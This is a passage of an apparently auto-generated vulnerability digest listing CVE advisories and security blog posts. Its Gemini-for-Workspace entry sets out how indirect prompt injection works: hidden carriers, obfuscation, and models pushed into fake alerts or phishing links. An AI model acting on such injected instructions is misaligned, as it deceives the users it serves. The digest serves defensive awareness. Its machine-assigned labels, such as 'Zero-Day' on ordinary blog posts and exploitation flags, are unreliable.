- **Active Exploitation:** true. Sources: Google's 32% relative increase in malicious IPI between November 2025 and February 2026 across 2-3B crawled pages per month; Forcepoint X-Labs' 10 verified payloads on live public domains; Trail of Bits' weaponized GitHub Copilot exploit; Help Net Security (2026-04-24); http://security.googleblog.com/2026/04/ai-threats-in-wild-current-state-of.html ; http://forcepoint.com/blog/x-labs/indirect-prompt-injection-payloads ; https://blog.trailofbits.com/2025/08/06/prompt-injection-engineering-for-attackers-exploiting-github-copilot/ ; http://helpnetsecurity.com/2026/04/24/indirect-prompt-injection-in-the-wild
- **Threat Actors:** None known
- **Mitigation:** Defense-in-depth posture rather than a single patch: (1) maintain a strict data-instruction boundary so external content cannot issue tool calls without explicit human confirmation; (2) constrain model behavior with system prompts requiring explicit user approval for high-risk actions (file deletion, payments, outbound requests); (3) deterministic output validation so injected instructions producing out-of-band artifacts are dropped; (4) semantic input/output filtering and the RAG Triad; (5) tag external content as untrusted throughout prompts and tool arguments; (6) enforce least-privilege agent identities; (7) mandatory human-in-the-loop for irreversible or external side-effect actions; (8) adversarial testing, dedicated red teams, and continuous monitoring against known payload patterns (e.g., swisskyrepo's PayloadsAllTheThings); (9) for the network/perimeter layer, Forcepoint recommends blocking IPI distribution URLs via web/URL analytics (Stage 3 redirect protection). Reports filed through Google AI VRP: https://bughunters.google.com/about/rules/google-friends/ai-vulnerability-reward-program-rules. For end users, treat AI-generated summaries of untrusted content as untrusted.
- **Vendor Advisory:** http://security.googleblog.com/2026/04/ai-threats-in-wild-current-state-of.html

---

## 10. 🟠 Zero-Day — Google Workspace’s continuous approach to mitigating indirect prompt injections

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Google Security Blog &nbsp;|&nbsp; **Published:** 2026-04-02
**Reference:** <http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html>

> Posted by Adam Gavish, Google GenAI Security Team Indirect prompt injection (IPI) is an evolving threat vector targeting users of complex AI applications with multiple data sources, such as Workspace with Gemini. This technique enables the attacker to influence the behavior of an LLM by injecting malicious instructions into the data or tools used by the LLM as it completes the user’s query. This m…

**Parallel AI Enrichment:**

- **Technical Details:** Indirect Prompt Injection (IPI) is a vulnerability class in which adversarial instructions are embedded in content the LLM ingests, causing the model to conflate data and instructions. In Workspace with Gemini the attack surface includes Gmail bodies, Slides speaker notes, Drive documents (including RAG-style local corpora), Chat messages, web pages Gemini summarizes, and images. Triggering a Gemini feature such as 'Summarize this email' or a document causes the model to execute the attacker's directives—appending fabricated 'security alerts', replacing summary output, invoking tools, leaking context, or directing the user to phishing sites/phone numbers (demonstrated end-to-end by HiddenLayer 2024 and 0din 2025). OWASP classifies this as LLM01:2025 Prompt Injection. Common obfuscation: hidden CSS text, Base64/emoji encoding, multilingual payloads, payload splitting across fields, and adversarial suffixes.
- **Affected Products:** Google Workspace with Gemini (cloud service, no fixed version numbers): Gmail, Google Docs, Google Drive, Google Chat, the standalone Gemini app, and Google Slides. Independent research also confirmed susceptibility across shared documents and local RAG instances.
- **CVSS Score:** CVSS score unavailable. No CVE has been issued; Google triaged third-party Workspace IPI reports as 'Intended Behavior / Won't Fix' rather than as CVSS-scored vulnerabilities.
- **CVSS Vector:** CVSS vector unavailable. No CVE has been issued for this advisory; indirect prompt injection is described as a threat class rather than a single scored vulnerability.
- **Exploit Available:** true. Public proof-of-concept payloads exist at https://www.hiddenlayer.com/research/new-gemini-for-workspace-vulnerability-enabling-phishing-content-manipulation (HiddenLayer, Sep 25, 2024) and https://0din.ai/blog/phishing-for-gemini (0din/Tracebit, Jul 10, 2025).
- **Patch Available:** true (continuous, no single patch URL). There is no CVE-bearing patch because no CVE has been issued; Google is continuously deploying the layered defenses described at http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html and the companion knowledge base http://knowledge.workspace.google.com/admin/security/indirect-prompt-injections-and-googles-layered-defense-strategy-for-gemini . Third-party Workspace IPI findings (e.g., HiddenLayer 2024) were triaged as 'Intended Behavior / Won't Fix'.
- **Active Exploitation:** true. Google states its layered protections have 'consistently mitigated indirect prompt injection attempts' against Workspace with Gemini (http://knowledge.workspace.google.com/admin/security/indirect-prompt-injections-and-googles-layered-defense-strategy-for-gemini). In-the-wild IPI sightings are corroborated independently by Palo Alto Unit42 (https://unit42.paloaltonetworks.com/ai-agent-prompt-injection/) and Forcepoint X-Labs (https://www.forcepoint.com/blog/x-labs/indirect-prompt-injection-payloads).
- **Threat Actors:** Threat actors unknown. No APT group, ransomware operator, or campaign has been publicly attributed to indirect prompt injection exploitation against Google Workspace with Gemini.
- **Mitigation:** Layered, continuously deployed (no single CVE patch): (1) Proactive discovery—human and automated (Simula) red-teaming plus the Google AI Vulnerability Reward Program. (2) Deterministic defenses—URL/context sanitization, tool-chaining policies, regex takedowns, and a centralized Policy Engine. (3) ML-based defenses—retraining models on partitioned synthetic IPI examples. (4) LLM-based defenses—iterative prompt engineering with refined system instructions. (5) Gemini model hardening—improving internal ability to ignore harmful instructions. Per Gemini-for-Workspace product surface (Gmail, Docs editors, Drive, Chat, standalone Gemini app): prompt-injection content classifiers, security-thinking reinforcement, markdown sanitization, suspicious-URL redaction via Google Safe Browsing, user-confirmation framework for risky actions, end-user security mitigation notifications, and adversarial model resilience. Practical guidance: keep Gemini features updated, treat AI summaries/links/'security alerts' with the same skepticism as unsolicited email, and require explicit user confirmation before Gemini performs high-impact actions.
- **Vendor Advisory:** http://security.googleblog.com/2026/04/google-workspaces-continuous-approach.html

---

## 11. 🟠 Zero-Day — Architecting Security for Agentic Capabilities in Chrome

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Google Security Blog &nbsp;|&nbsp; **Published:** 2025-12-08
**Reference:** <http://security.googleblog.com/2025/12/architecting-security-for-agentic.html>

> Posted by Nathan Parker, Chrome security team Chrome has been advancing the web’s security for well over 15 years, and we’re committed to meeting new challenges and opportunities with AI. Billions of people trust Chrome to keep them safe by default, and this is a responsibility we take seriously. Following the recent launch of Gemini in Chrome and the preview of agentic capabilities , we want to s…

---

## 12. 🟠 Zero-Day — Rust in Android: move fast and fix things

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Google Security Blog &nbsp;|&nbsp; **Published:** 2025-11-13
**Reference:** <http://security.googleblog.com/2025/11/rust-in-android-move-fast-fix-things.html>

> Posted by Jeff Vander Stoep, Android Last year, we wrote about why a memory safety strategy that focuses on vulnerability prevention in new code quickly yields durable and compounding gains. This year we look at how this approach isn’t just fixing things, but helping us move faster . The 2025 data continues to validate the approach, with memory safety vulnerabilities falling below 20% of total vul…

---

## 13. 🟠 Zero-Day — Mitigating prompt injection attacks with a layered defense strategy

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Google Security Blog &nbsp;|&nbsp; **Published:** 2025-06-13
**Reference:** <http://security.googleblog.com/2025/06/mitigating-prompt-injection-attacks.html>

> Posted by Adam Gavish, Google GenAI Security Team With the rapid adoption of generative AI, a new wave of threats is emerging across the industry with the aim of manipulating the AI systems themselves. One such emerging attack vector is indirect prompt injections. Unlike direct prompt injections, where an attacker directly inputs malicious commands into a prompt, indirect prompt injections involve…

---

## 14. 🟠 Zero-Day — Countering Chinese State-Sponsored Actors Compromise of Networks Worldwide to Feed Global Espionage System

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** CISA US-CERT Alerts &nbsp;|&nbsp; **Published:** Mon, 25 Au
**Reference:** <https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-239a>

> Executive summary People’s Republic of China (PRC) state-sponsored cyber threat actors are targeting networks globally, including, but not limited to, telecommunications, government, transportation, lodging, and military infrastructure networks. While these actors focus on large backbone routers of major telecommunications providers, as well as provider edge (PE) and customer edge (CE) routers, th…

---

## 15. 🟠 Zero-Day — Russian GRU Targeting Western Logistics Entities and Technology Companies

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** CISA US-CERT Alerts &nbsp;|&nbsp; **Published:** Mon, 12 Ma
**Reference:** <https://www.cisa.gov/news-events/cybersecurity-advisories/aa25-141a>

> Executive Summary This joint cybersecurity advisory (CSA) highlights a Russian state-sponsored cyber campaign targeting Western logistics entities and technology companies. This includes those involved in the coordination, transport, and delivery of foreign assistance to Ukraine. Since 2022, Western logistics entities and IT companies have faced an elevated risk of targeting by the Russian General…

---

## 16. 🟠 Zero-Day — Browser Security: Zero-Days Are Only Part of the Problem

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** CrowdStrike Blog &nbsp;|&nbsp; **Published:** Jun 30, 20
**Reference:** <https://www.crowdstrike.com/en-us/blog/browser-security-zero-days-are-only-part-of-the-problem/>

---

## 17. 🟠 Zero-Day — 94% of Organizations Report Cloud Breaches: CrowdStrike State of CDR Survey

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** CrowdStrike Blog &nbsp;|&nbsp; **Published:** Jun 22, 20
**Reference:** <https://www.crowdstrike.com/en-us/blog/crowdstrike-state-of-cdr-survey-key-takeaways/>

---

## 18. 🟠 Zero-Day — CrowdStrike Uncovers New Prompt Injection Techniques

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** CrowdStrike Blog &nbsp;|&nbsp; **Published:** Jul 07, 20
**Reference:** <https://www.crowdstrike.com/en-us/blog/crowdstrike-uncovers-new-prompt-injection-techniques/>

---

## 19. 🟠 Zero-Day — Chinese hackers develop LONGLEASH malware to expand ORB network

**CVE:** _No CVE_ &nbsp;|&nbsp; **Source:** Bleeping Computer &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://www.bleepingcomputer.com/news/security/chinese-hackers-develop-longleash-malware-to-expand-orb-network/>

> Chinese hackers tracked as &#x27;UAT-7810&#x27; are actively evolving their malware to expand their Operational Relay Box (ORB) network by compromising internet-facing networking devices, primarily unpatched Ruckus routers. [...]

---

## 20. 🟡 High Severity — Open WebUI has Blind Server Side Request Forgery in its Image Edit Functionality

**CVE:** `CVE-2026-34225` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://github.com/advisories/GHSA-jgx9-jr5x-mvpv>

> ### Summary
There is a blind server side request forgery in the functionality that allows editing an image via a prompt. The affected function will perform a GET request on the URL provided by the user. There is no restriction on the domain of the provided URL allowing the local address space to be interacted with. Since the SSRF is blind (the response cannot be read) impact is port scanning of th…

---

## 21. 🟡 High Severity — Open WebUI vulnerable to stored XSS via unescaped markdown token in MarkdownTokens.svelte leading to full account takeover and RCE via functions

**CVE:** `CVE-2025-46719` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://github.com/advisories/GHSA-9f4f-jv96-8766>

> ### Summary

A vulnerability in the way certain html tags in chat messages are rendered allows attackers to inject JavaScript code into a chat transcript. The JavaScript code will be executed in the user&#x27;s browser every time that chat transcript is opened, allowing attackers to retrieve the user&#x27;s access token and gain full control over their account. Chat transcripts can be shared with …

---

## 22. 🟡 High Severity — EGroupware has Authenticated RCE via Malicious eTemplate Upload

**CVE:** `CVE-2026-40187` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://github.com/advisories/GHSA-8737-2x9g-xjj7>

> ## Summary

An authenticated administrator can achieve OS-level Remote Code Execution (RCE) by uploading a malicious eTemplate XML file (`.xet`) to the VFS `/etemplates` mount.

The `Widget::expand_name()` method passes template widget attribute values directly into a PHP `eval()` call with only double-quote escaping applied - **backtick characters are not escaped**.

In PHP, backticks inside a do…

---

## 23. 🟡 High Severity — New API: SSRF Protection Bypass via Unresolved Hostname in Notification URLs

**CVE:** `CVE-2026-33655` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://github.com/advisories/GHSA-6qcr-qxgr-m7fv>

> ## Summary

The default SSRF protection configuration did not apply IP filtering to hostnames. With `ApplyIPFilterForDomain` disabled by default, URL validation checked domain allow/block rules but did not resolve a hostname and validate the resolved IP address. Authenticated users could configure notification URLs for Webhook, Bark, or Gotify notifications and point a hostname at an internal or m…

---

## 24. 🟡 High Severity — EGroupware has a Remote Code Execution Vulnerability

**CVE:** `CVE-2026-27823` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://github.com/advisories/GHSA-h9qx-v5xp-ph8p>

> ## Summary
A critical vulnerability has been identified in EGroupware that may lead to Remote Code Execution (RCE).
The issue allows an authenticated attacker to execute arbitrary commands on the server. If user self-registration is enabled, the vulnerability may be exploitable without prior authentication.

The vulnerability stems from improper authorization checks combined with a file write prim…

---

## 25. 🟡 High Severity — Critical Adobe ColdFusion Vulnerability Exploited in Attacks

**CVE:** `CVE-2026-48282` &nbsp;|&nbsp; **Source:** SecurityWeek &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://www.securityweek.com/critical-adobe-coldfusion-vulnerability-exploited-in-attacks/>

> Hackers are exploiting a recently patched critical vulnerability (CVE-2026-48282) in Adobe ColdFusion that carries a CVSS score of 10/10. The post Critical Adobe ColdFusion Vulnerability Exploited in Attacks appeared first on SecurityWeek .

---

## 26. 🟡 High Severity — Suspected China-Aligned Hackers Exploit Roundcube Flaws Against Universities

**CVE:** `CVE-2024-42009` &nbsp;|&nbsp; **Source:** The Hacker News Security &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://thehackernews.com/2026/07/suspected-china-aligned-hackers-exploit.html>

> A suspected China-aligned threat activity cluster has been observed exploiting Roundcube webmail software belonging to physics and engineering departments of U.S. and Canadian universities as part of a new campaign.

The activity involves the exploitation of now-patched, critical security flaws in the open-source email solution, such as CVE-2024-42009 (CVSS score: 9.3), to siphon credentials,

---

## 27. 🟡 High Severity — CERT/CC Warns of Hidden Admin Backdoor in Tenda Router Firmware

**CVE:** `CVE-2026-11405` &nbsp;|&nbsp; **Source:** The Hacker News Security &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://thehackernews.com/2026/07/certcc-warns-of-hidden-admin-backdoor.html>

> Several versions of firmware released by Chinese network device manufacturer Tenda have been found to embed an undocumented authentication backdoor that enables administrative access to the devices&#x27; web management interfaces, the CERT Coordination Center (CERT/CC) warned Monday.

&quot;An attacker can exploit this vulnerability, tracked as CVE-2026-11405, to bypass the password verification p…

---

## 28. 🟡 High Severity — OPNsense XPATH Injection (CVE-2026-53582)

**CVE:** `CVE-2026-53582` &nbsp;|&nbsp; **Source:** Full Disclosure &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://seclists.org/fulldisclosure/2026/Jul/18>

> Posted by evan on Jul 06 SUMMARY: a stored XPATH injection allows any user with just ca manager/certificate manager perms to leak any secret key/any value in config.xml, thus achieving privilege escalation and potentially remote code execution. this can also likely be chained via csrf and some clever hiding. see https://github.com/opnsense/core/security/advisories/GHSA-xww7-76m6-mh2r == VULN == th…

---

## 29. 🟡 High Severity — BeyondTrust Patches Critical Auth Bypass Flaws in Remote Support and PRA

**CVE:** `CVE-2026-40138` &nbsp;|&nbsp; **Source:** The Hacker News Security &nbsp;|&nbsp; **Published:** 2026-07-07
**Reference:** <https://thehackernews.com/2026/07/beyondtrust-patches-critical-auth.html>

> BeyondTrust has released updates to address two critical security flaws affecting Remote Support (RS) and Privileged Remote Access (PRA) products that, if successfully exploited, could allow unauthenticated attackers to take control of susceptible devices.

The vulnerabilities are listed below -


  CVE-2026-40138 (CVSS score: 9.2) - A pre-authentication vulnerability exists in the

---

## 30. 🟡 High Severity — mknod: Device nodes created mislabeled on SELinux, with broken cleanup (remove_dir on a node)

**CVE:** `CVE-2026-35361` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-r9hw-mj3w-phcq>

> uutils calls `mknod` *before* setting the SELinux context (GNU uses `setfscreatecon` first, labeling atomically). If `set_selinux_security_context` fails, cleanup uses `std::fs::remove_dir`, which cannot remove device nodes or FIFOs, leaving the mislabeled node behind.

**Impact:** on SELinux-enforcing systems the node is created with the wrong context; the command reports failure but leaves a mis…

---

## 31. 🟡 High Severity — mkfifo: permissions of an existing file are changed after FIFO creation fails

**CVE:** `CVE-2026-35341` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-pmf6-rcx4-v53v>

> When `mkfifo()` fails (e.g. target already exists), the code shows an error but is missing a `continue;`, so it falls through to `fs::set_permissions` and changes the permissions of the pre-existing file to the default FIFO mode (`0o666` &amp; umask -&gt; `0644`).

```
$ touch secret; chmod 000 secret
$ coreutils mkfifo secret fifo3 fifo4
mkfifo: cannot create fifo &#x27;secret&#x27;: File exists
…

---

## 32. 🟡 High Severity — 9routers has Exposure of Sensitive Information and Unprotected Database Import/Export, Allowing Complete Credential Theft and Database Takeover

**CVE:** `CVE-2026-55500` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-qvfm-67h2-2qfx>

> ## Summary

The `/api/settings/database` endpoint allows full database export (containing all credentials, API keys, OAuth tokens, and settings) and full database import (complete overwrite) without any authentication requirement beyond the `ALWAYS_PROTECTED` middleware check, which only validates JWT or CLI token. Combined with other vulnerabilities (e.g., default password, tunnel exposure), this…

---

## 33. 🟡 High Severity — Craft CMS: Potential authenticated Remote Code Execution via referrer redirect

**CVE:** `CVE-2026-55794` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-f74w-488g-8x5r>

> ### Requirements:

* Control panel access
* Permissions to edit an entry

### Details

Control panel users with the ability to edit entries can execute unsandboxed Twig code via the HTTP Referrer header.

The issue happens when a user is saving entries. Strings for a signed redirect URL are being compiled as a Twig template via `renderObjectTemplate()`, and while a sandboxed alternative already ex…

---

## 34. 🟡 High Severity — Linuxfabrik Monitoring Plugins have local privilege escalation using embedded command

**CVE:** `CVE-2026-55426` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-798h-hpph-m24j>

> ### Summary
When a check plugin places user provided input inside a command which is passed to `shell_exec`, an attacker can abuse this to run arbitrary commands. This is mainly dangerous for plugins which are listed in the sudoers file, because this allows an attacker controlling the nagios user to get root privileges.

### Details
An example for this is the `restic-check` plugin, where the `--re…

---

## 35. 🟡 High Severity — Suspended Coder users retain access to AI Bridge LLM proxy endpoints

**CVE:** `CVE-2026-55435` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-wqxv-w64v-5wh6>

> ### Summary

AI Bridge proxy endpoints authenticate via `Server.IsAuthorized` in `coderd/aibridgedserver`, which validates key format, expiry, secret and deleted or system users but does not check whether the account is suspended. Because suspension does not revoke existing API keys, a suspended user&#x27;s unexpired token keeps working.

&gt; **Note:** Practical impact is limited to already-issue…

---

## 36. 🟡 High Severity — Coder: Devcontainer recreate endpoint missing write authorization allows read-only roles to destroy containers

**CVE:** `CVE-2026-55433` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-jqj2-x4c5-jfxm>

> ### Summary

The devcontainer recreate endpoint relied on route middleware that checked only `ActionRead` on the workspace and, unlike the sibling delete endpoint, performed no `ActionUpdate` check before triggering the destructive rebuild.

&gt; **Note:** Exploitation requires an existing low-privilege role with access to the target workspace.

### Impact

Any authenticated principal with read-on…

---

## 37. 🟡 High Severity — Coder: User-admin role can reset owner account password

**CVE:** `CVE-2026-55077` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-29xf-69gq-m9jx>

> ### Summary

The `PUT /api/v2/users/{user}/password` endpoint authorized only `ActionUpdatePersonal` and did not prevent a `user-admin` from resetting an `owner` account&#x27;s password. It also did not require the current password when an admin reset another user&#x27;s password.

&gt; **Note:** Exploitation requires the privileged `user-admin` role so practical risk is limited to deployments tha…

---

## 38. 🟡 High Severity — Coder vulnerable to OIDC account takeover via email-based user matching and email_verified bypass

**CVE:** `CVE-2026-55075` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-9r87-mvcw-x35f>

> ### Summary

Two flaws in Coder&#x27;s OIDC login chained into account takeover: email-based user matching fell back to linking by email without checking for an existing link to a different IdP subject and the `email_verified` claim was only enforced when present as a boolean `false` so an absent or non-boolean claim was treated as verified.

### Impact

An attacker who could authenticate at the c…

---

## 39. 🟡 High Severity — Coder's OIDC email_verified type coercion bypass enables account takeover via unverified email linking

**CVE:** `CVE-2026-55076` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-75vm-6w67-gwvp>

> ### Summary

Coder&#x27;s OIDC callback checked `email_verified` with a direct Go `bool` type assertion. When an IdP returned the claim as a non-boolean (for example the string `&quot;false&quot;`) or omitted it, the assertion failed open and the email was treated as verified. Combined with an unconditional email-based account fallback, this enabled account takeover.

### Impact

An attacker who r…

---

## 40. 🟡 High Severity — OpenRemote has Cross-Realm User Information Disclosure in UserResourceImpl

**CVE:** `CVE-2026-54641` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-xqr9-4wvv-gvch>

> ### Summary

A realm admin of tenant B can read the profile, client roles, and realm roles of any user in any other realm (including the master realm) by supplying the target user&#x27;s UUID in the REST API path. Three read endpoints in UserResourceImpl check whether the caller holds the read:admin role but omit a check that the target user belongs to the caller&#x27;s own realm. The vulnerabilit…

---

## 41. 🟡 High Severity — GoFiber never set HSTS header in helmet middleware due to incorrect protocol check

**CVE:** `CVE-2026-53624` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-gv83-gqw6-9j2c>

> ### Summary

The `helmet` middleware in gofiber/fiber never sets the `Strict-Transport-Security` (HSTS) response header, even when `HSTSMaxAge` is explicitly configured, because the condition check at `helmet.go:67` uses `c.Protocol()` — which returns the HTTP protocol version string (e.g., `&quot;HTTP/1.1&quot;`, `&quot;HTTP/2.0&quot;`) — instead of `c.Scheme()` — which returns the URL scheme (`&…

---

## 42. 🟡 High Severity — Langroid: handle_message() executes user-supplied tool JSON without sender verification 

**CVE:** `CVE-2026-54771` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-gjgq-w2m6-wr5q>

> ## Summary

A Langroid application exposing a chat interface to untrusted users may allow direct tool invocation via raw JSON payloads, even when tools are registered with `use=False, handle=True`.

## Details

`enable_message(..., use=False, handle=True)` only prevents the LLM from being instructed to generate the tool. The tool dispatch path in `agent_response()` → `handle_message()` → `get_tool…

---

## 43. 🟡 High Severity — Dragonfly scheduler v1 and v2 gRPC unauthenticated SSRF via attacker-controlled PeerHost in DownloadTinyFile

**CVE:** `CVE-2026-54637` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-chwm-m7g7-685g>

> ## Summary

The Dragonfly **scheduler**&#x27;s v1 gRPC service contains an unauthenticated Server-Side Request Forgery (SSRF). When a peer reports a successful download of a TINY task, the scheduler calls `Peer.DownloadTinyFile()` and issues an HTTP `GET` to a host and port taken verbatim from the attacker-controlled `PeerHost.Ip` / `PeerHost.DownPort` fields of the gRPC request body. The HTTP cli…

---

## 44. 🟡 High Severity — Decompress: Archive extraction can create files and links outside of the target directory

**CVE:** `CVE-2026-53486` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-mp2f-45pm-3cg9>

> ### Impact

When extracting an archive to a directory, a crafted archive can read or write files outside that directory. The flaw is in the code that writes the parsed entries, so it affects every format decompress handles: tar, tar.gz, tar.bz2, and zip by default, plus any others added through the plugins option.

A link (hardlink) or symlink entry is created without checking where its target poi…

---

## 45. 🟡 High Severity — mv: symlinks expanded during cross-device move (resource exhaustion / data duplication)

**CVE:** `CVE-2026-35365` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-h444-6j9x-p8vh>

> When moving directories across filesystems, uutils `mv` dereferences symlinks inside the tree, copying their targets as real files/dirs instead of preserving the symlinks. GNU preserves symlinks by default. E.g. a `etc_link -&gt; /etc` inside the source becomes a full copy of `/etc` at the destination.

**Impact:** (1) resource exhaustion — a small tree can expand into a huge copy (time/disk DoS);…

---

## 46. 🟡 High Severity — id: groups= computed from real GID instead of effective GID

**CVE:** `CVE-2026-35370` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-47c7-qrm7-mqw7>

> The id utility in uutils coreutils miscalculates the groups= section of its output. The implementation uses a user&#x27;s real GID instead of their effective GID to compute the group list, leading to potentially divergent output compared to GNU coreutils. Because many scripts and automated processes rely on the output of id to make security-critical access-control or permission decisions, this dis…

---

## 47. 🟡 High Severity — install: TOCTOU symlink race (unlink-then-create without O_EXCL) allows arbitrary file overwrite

**CVE:** `CVE-2026-35355` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-239g-2685-54x3>

> `copy_file` in `install/src/install.rs` removes the destination then recreates it by pathname via `File::create` / `fs::copy` without `O_EXCL`/`create_new`. Between the unlink and the recreate, a local attacker with write access to the destination directory can drop in a symlink and redirect the write.

**Impact:** when `install` runs privileged into an attacker-writable directory (staging/build p…

---

## 48. 🟡 High Severity — ln: rejects non-UTF-8 source filenames in target-directory mode

**CVE:** `CVE-2026-35373` &nbsp;|&nbsp; **Source:** GitHub Security Advisories &nbsp;|&nbsp; **Published:** 2026-07-06
**Reference:** <https://github.com/advisories/GHSA-jcjr-rh8q-7xqf>

> In target-directory forms (`ln SOURCE... DIRECTORY`), `ln` rejects source paths with non-UTF-8 filename bytes, while GNU accepts them. Breaks GNU compatibility for byte-oriented filenames on Unix filesystems.

PoC:
```
name=$(printf &#x27;bad_\377&#x27;); mkdir dst; : &gt; &quot;$name&quot;; ln &quot;$name&quot; dst
# GNU: exit 0, creates dst/bad_\377 ; uutils: exit 1, dst empty
```

---
_Zellic p…

---

## 49. 🟡 High Severity — Bringing Rust to the Pixel Baseband

**CVE:** `CVE-2024-27227` &nbsp;|&nbsp; **Source:** Google Security Blog &nbsp;|&nbsp; **Published:** 2026-04-10
**Reference:** <http://security.googleblog.com/2026/04/bringing-rust-to-pixel-baseband.html>

> Posted by Jiacheng Lu, Software Engineer, Google Pixel Team Google is continuously advancing the security of Pixel devices. We have been focusing on hardening the cellular baseband modem against exploitation. Recognizing the risks associated within the complex modem firmware, Pixel 9 shipped with mitigations against a range of memory-safety vulnerabilities. For Pixel 10, Google is advancing its pr…

---
